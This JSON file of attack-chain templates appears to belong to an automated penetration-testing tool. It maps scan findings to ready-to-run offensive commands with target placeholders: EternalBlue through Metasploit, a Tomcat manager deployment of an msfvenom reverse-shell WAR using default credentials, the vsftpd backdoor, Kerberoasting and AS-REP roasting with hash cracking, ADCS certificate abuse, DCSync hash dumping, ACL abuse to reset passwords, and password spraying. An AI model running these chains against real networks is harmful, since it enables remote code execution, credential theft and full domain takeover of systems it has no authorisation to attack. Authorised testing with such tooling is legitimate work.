{
  "_comment": "Attack-chain templates. A chain matches when ALL of its 'when' conditions hold against the state (conditions absent are ignored): service_ports (any host has a service on one of these ports), os_contains (any host OS guess contains the string), product_contains (any service product contains it), finding_contains (any finding title contains it). Steps support {TARGET} {LHOST} {LPORT} placeholders.",
  "chains": [
    {
      "id": "eternalblue",
      "name": "MS17-010 EternalBlue (legacy Windows SMB)",
      "priority": 0,
      "when": {"service_ports": [445], "os_contains": "windows"},
      "steps": [
        "nmap -p445 --script smb-vuln-ms17-010 {TARGET}",
        "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {TARGET}; set LHOST {LHOST}; run'"
      ]
    },
    {
      "id": "web-traversal",
      "name": "Path traversal -> RCE",
      "priority": 0,
      "when": {"finding_contains": "traversal"},
      "steps": [
        "# confirm the traversal, then read /etc/passwd",
        "# CVE-2021-41773/42013: POST /cgi-bin/.%2e/%2e%2e/bin/sh with a command body",
        "breachload poc <cfg> --title traversal"
      ]
    },
    {
      "id": "tomcat-manager",
      "name": "Tomcat manager WAR deploy",
      "priority": 1,
      "when": {"product_contains": "tomcat"},
      "steps": [
        "# browse /manager/html and /host-manager/html; try tomcat:tomcat, admin:admin",
        "msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f war -o shell.war",
        "curl -u tomcat:tomcat -T shell.war 'http://{TARGET}:8080/manager/text/deploy?path=/shell'"
      ]
    },
    {
      "id": "ftp-anon",
      "name": "Anonymous FTP foothold",
      "priority": 2,
      "when": {"service_ports": [21]},
      "steps": [
        "ftp {TARGET}   # login anonymous / anonymous",
        "# banner vsftpd 2.3.4 => CVE-2011-2523 backdoor: nc {TARGET} 6200",
        "wget -m --no-passive ftp://anonymous:anonymous@{TARGET}/"
      ]
    },
    {
      "id": "smb-quickwins",
      "name": "SMB enumeration quick wins",
      "priority": 3,
      "when": {"service_ports": [139, 445]},
      "steps": [
        "smbclient -N -L //{TARGET}/          # null-session share listing",
        "smbmap -H {TARGET}                    # share permissions",
        "enum4linux-ng -A {TARGET}"
      ]
    },
    {
      "id": "ad-unauth-enum",
      "name": "Active Directory - unauthenticated enumeration",
      "priority": 0,
      "when": {"finding_contains": "domain controller"},
      "steps": [
        "nxc smb {TARGET}                       # host/domain/signing (netexec)",
        "nxc smb {TARGET} -u '' -p '' --shares  # null session shares",
        "nxc smb {TARGET} --users --rid-brute   # enumerate users via RID cycling",
        "impacket-GetNPUsers {DOMAIN}/ -dc-ip {TARGET} -usersfile users.txt -no-pass  # AS-REP roast (no creds)",
        "ldapsearch -x -H ldap://{TARGET} -s base namingContexts   # anonymous LDAP base"
      ]
    },
    {
      "id": "ad-authed-enum",
      "name": "Active Directory - authenticated enum + BloodHound",
      "priority": 0,
      "when": {"finding_contains": "domain controller", "has_credentials": true},
      "steps": [
        "nxc smb {TARGET} -u {USER} -p '{PASS}' --shares --users --groups --pass-pol",
        "nxc ldap {TARGET} -u {USER} -p '{PASS}' --bloodhound --collection All --dns-server {TARGET}",
        "bloodhound-python -u {USER} -p '{PASS}' -d {DOMAIN} -ns {TARGET} -c All --zip",
        "# import the zip into BloodHound and look for shortest paths to Domain Admins",
        "ldapdomaindump -u '{DOMAIN}\\\\{USER}' -p '{PASS}' {TARGET}"
      ]
    },
    {
      "id": "ad-kerberoast",
      "name": "Active Directory - Kerberoasting / AS-REP roasting",
      "priority": 1,
      "when": {"finding_contains": "domain controller", "has_credentials": true},
      "steps": [
        "nxc ldap {TARGET} -u {USER} -p '{PASS}' --kerberoasting kerb.txt",
        "impacket-GetUserSPNs {DOMAIN}/{USER}:'{PASS}' -dc-ip {TARGET} -request -outputfile kerb.txt",
        "impacket-GetNPUsers {DOMAIN}/{USER}:'{PASS}' -dc-ip {TARGET} -request  # AS-REP for DONT_REQ_PREAUTH",
        "hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt   # crack TGS (18200 for AS-REP)"
      ]
    },
    {
      "id": "ad-adcs",
      "name": "Active Directory Certificate Services (ADCS) - certipy",
      "priority": 0,
      "when": {"finding_contains": "domain controller", "has_credentials": true},
      "steps": [
        "certipy find -u {USER}@{DOMAIN} -p '{PASS}' -dc-ip {TARGET} -stdout -vulnerable",
        "# ESC1: certipy req -u {USER}@{DOMAIN} -p '{PASS}' -ca <CA> -template <tmpl> -upn administrator@{DOMAIN}",
        "# ESC8 (NTLM relay to web enrollment): certipy relay -ca <ca-host>",
        "certipy auth -pfx administrator.pfx -dc-ip {TARGET}   # TGT + NT hash from the cert"
      ]
    },
    {
      "id": "ad-privesc-dcsync",
      "name": "Active Directory - ACL abuse / DCSync (needs privilege)",
      "priority": 1,
      "when": {"finding_contains": "domain controller", "has_credentials": true},
      "steps": [
        "# with DCSync rights (Replicating Directory Changes) dump all hashes:",
        "impacket-secretsdump {DOMAIN}/{USER}:'{PASS}'@{TARGET}",
        "nxc smb {TARGET} -u {USER} -p '{PASS}' --ntds   # if local admin on the DC",
        "# ACL abuse (from BloodHound): bloodyAD --host {TARGET} -d {DOMAIN} -u {USER} -p '{PASS}' add genericAll <target> <you>",
        "# then reset a password / add to a group: bloodyAD ... set password <user> 'NewPass1'"
      ]
    },
    {
      "id": "ad-password-spray",
      "name": "Active Directory - password spraying",
      "priority": 2,
      "when": {"finding_contains": "domain controller"},
      "steps": [
        "nxc smb {TARGET} -u users.txt -p 'Season2024!' --continue-on-success   # spray one password",
        "kerbrute passwordspray -d {DOMAIN} --dc {TARGET} users.txt 'Season2024!'"
      ]
    }
  ]
}
